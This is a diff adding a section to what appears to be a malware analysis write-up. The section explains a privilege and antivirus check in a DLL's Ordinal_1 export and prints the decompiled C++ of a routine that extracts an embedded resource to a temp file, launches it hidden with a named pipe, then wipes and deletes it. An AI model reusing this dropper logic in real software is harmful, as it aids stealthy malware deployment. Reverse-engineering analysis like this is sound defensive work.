@@ -4584,6 +4584,154 @@ Although we do not directly see anything get infected it is highly likely that t
 
 ### Back to Ordinal_1
 
+Back in `Ordinal_1` the next statement we see is only executed with certain privileges and when a certain anti virus is not running.
+
+```cpp
+if (((granted_privileges & 2) != 0) && ((detected_anti_virus & 1) != 0)) {
+  FUN_10007545();
+}
+```
+
+The privilege being checked for is the `SeDebugPrivilege`. The bit being checked in `detected_anti_virus` is the 1st one. This is odd because no information is actually stored in that location. The most likely explanation then is that this is a check to see if anti virus detection was performed at all as this bit would be 0 if the anti virus detection failed to execute.
+
+### FUN_10007545
+
+```cpp
+void FUN_10007545(void){
+  SIZE_T SVar1;
+  HANDLE hHeap;
+  HMODULE hModule;
+  FARPROC pFVar2;
+  HRSRC pHVar3;
+  int iVar4;
+  DWORD dwFlags;
+  UINT UVar5;
+  HRESULT HVar6;
+  BOOL BVar7;
+  char *lpProcName;
+  undefined *lpMem;
+  WCHAR local_1aa4 [1024];
+  WCHAR local_12a4 [1024];
+  WCHAR local_aa4 [520];
+  WCHAR local_694 [780];
+  _STARTUPINFOW local_7c;
+  _PROCESS_INFORMATION local_38;
+  ulong local_28;
+  undefined4 local_24;
+  undefined4 uStack32;
+  undefined4 uStack28;
+  HANDLE local_18;
+  int local_14;
+  LPOLESTR local_10;
+  undefined *local_c;
+  SIZE_T local_8;
+  
+  local_c = (undefined *)0x0;
+  local_8 = 0;
+  hHeap = GetCurrentProcess();
+  lpProcName = "IsWow64Process";
+  local_14 = 0;
+  hModule = GetModuleHandleW(L"kernel32.dll");
+  pFVar2 = GetProcAddress(hModule,lpProcName);
+  if (pFVar2 != (FARPROC)0x0) {
+    (*pFVar2)(hHeap,&local_14);
+  }
+  pHVar3 = FindResourceW(DLL_handle,(LPCWSTR)((uint)(local_14 != 0) + 1),(LPCWSTR)0xa);
+  if (pHVar3 == (HRSRC)0x0) {
+    iVar4 = 0;
+  }
+  else {
+    iVar4 = FUN_100085d0(&local_8,pHVar3);
+  }
+  if (iVar4 != 0) {
+    dwFlags = GetTempPathW(0x208,local_aa4);
+    lpMem = local_c;
+    SVar1 = local_8;
+    if ((dwFlags != 0) &&
+       (UVar5 = GetTempFileNameW(local_aa4,(LPCWSTR)0x0,0,local_694), lpMem = local_c,
+       SVar1 = local_8, UVar5 != 0)) {
+      local_28 = 0;
+      local_24 = 0;
+      uStack32 = 0;
+      uStack28 = 0;
+      HVar6 = CoCreateGuid((GUID *)&local_28);
+      lpMem = local_c;
+      SVar1 = local_8;
+      if (-1 < HVar6) {
+        local_10 = (LPOLESTR)0x0;
+        HVar6 = StringFromCLSID((IID *)&local_28,&local_10);
+        lpMem = local_c;
+        SVar1 = local_8;
+        if (-1 < HVar6) {
+          iVar4 = FUN_100073ae(local_694,local_c);
+          if (iVar4 != 0) {
+            wsprintfW(local_12a4,L"\\\\.\\pipe\\%ws",local_10);
+            local_18 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_100073fd,local_12a4,0,
+                                    (LPDWORD)0x0);
+            lpMem = local_c;
+            SVar1 = local_8;
+            if (local_18 != (HANDLE)0x0) {
+              local_38.hProcess = (HANDLE)0x0;
+              local_38.hThread = (HANDLE)0x0;
+              local_38.dwProcessId = 0;
+              local_38.dwThreadId = 0;
+              memset(&local_7c,0,0x44);
+              local_7c.wShowWindow = 0;
+              local_7c.cb = 0x44;
+              wsprintfW(local_1aa4,L"\"%ws\" %ws",local_694,local_12a4);
+              BVar7 = CreateProcessW(local_694,local_1aa4,(LPSECURITY_ATTRIBUTES)0x0,
+                                     (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0
+                                     ,(LPSTARTUPINFOW)&local_7c,(LPPROCESS_INFORMATION)&local_38);
+              if (BVar7 != 0) {
+                WaitForSingleObject(local_38.hProcess,60000);
+                FUN_100070fa();
+                TerminateThread(local_18,0);
+              }
+              CloseHandle(local_18);
+              lpMem = local_c;
+              SVar1 = local_8;
+            }
+            while (SVar1 != 0) {
+              *lpMem = 0;
+              lpMem = lpMem + 1;
+              SVar1 = SVar1 - 1;
+            }
+            FUN_100073ae(local_694,local_c);
+            DeleteFileW(local_694);
+          }
+          CoTaskMemFree(local_10);
+          lpMem = local_c;
+          SVar1 = local_8;
+        }
+      }
+    }
+    while (SVar1 != 0) {
+      *lpMem = 0;
+      lpMem = lpMem + 1;
+      SVar1 = SVar1 - 1;
+    }
+    dwFlags = 0;
+    lpMem = local_c;
+    hHeap = GetProcessHeap();
+    HeapFree(hHeap,dwFlags,lpMem);
+  }
+  return;
+}
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 # Memory:
 
